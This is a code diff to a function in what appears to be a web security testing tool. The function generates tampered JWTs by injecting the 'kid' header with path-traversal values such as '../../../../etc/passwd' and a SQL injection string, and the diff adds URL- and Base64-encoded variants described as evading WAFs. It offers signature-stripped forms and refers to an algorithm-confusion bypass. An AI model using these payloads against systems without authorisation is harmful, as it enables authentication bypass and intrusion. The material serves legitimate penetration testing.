@@ -405,23 +405,39 @@ def _jwt_candidates(value: str) -> List[TamperCandidate]:
       break
 
   # 4. kid (Key ID) injection — path traversal + SQL injection variants
+  #    Each path-traversal value gets three forms: raw, URL-encoded slashes,
+  #    and Base64-encoded — the latter two evade WAFs that regex-match on
+  #    literal "../" strings inside decoded JWT headers.
+  _PATH_TRAVERSAL_KIDS = [
+    "../../dev/null",
+    "../../../../etc/passwd",
+  ]
+  _EXTRA_KIDS = [
+    "' OR '1'='1",
+    "0",
+  ]
   if 'kid' in header:
-    for kid_val in [
-      "../../dev/null",
-      "../../../../etc/passwd",
-      "' OR '1'='1",
-      "0",
-    ]:
-      new_header       = dict(header)
+    kid_variants: list[tuple[str, str]] = []
+    for raw in _PATH_TRAVERSAL_KIDS:
+      url_enc = raw.replace("/", "%2F")
+      b64_enc = base64.b64encode(raw.encode()).decode()
+      kid_variants.append((raw,     f"raw path traversal"))
+      kid_variants.append((url_enc, f"URL-encoded slashes"))
+      kid_variants.append((b64_enc, f"Base64-encoded path"))
+    for raw in _EXTRA_KIDS:
+      kid_variants.append((raw, f"kid injection"))
+
+    for kid_val, label in kid_variants:
+      new_header        = dict(header)
       new_header['kid'] = kid_val
       new_h = _b64_encode(_json.dumps(new_header, separators=(',', ':')).encode())
       results.append(TamperCandidate(
         f"{new_h}.{parts[1]}.{parts[2]}",
-        f"JWT kid injection: {kid_val!r} (original sig)",
+        f"JWT kid {label}: {kid_val!r} (original sig)",
       ))
       results.append(TamperCandidate(
         f"{new_h}.{parts[1]}.",
-        f"JWT kid injection: {kid_val!r} (empty sig)",
+        f"JWT kid {label}: {kid_val!r} (empty sig)",
       ))
 
   # 5. RS256→HS256 algorithm confusion (sign-check bypass)
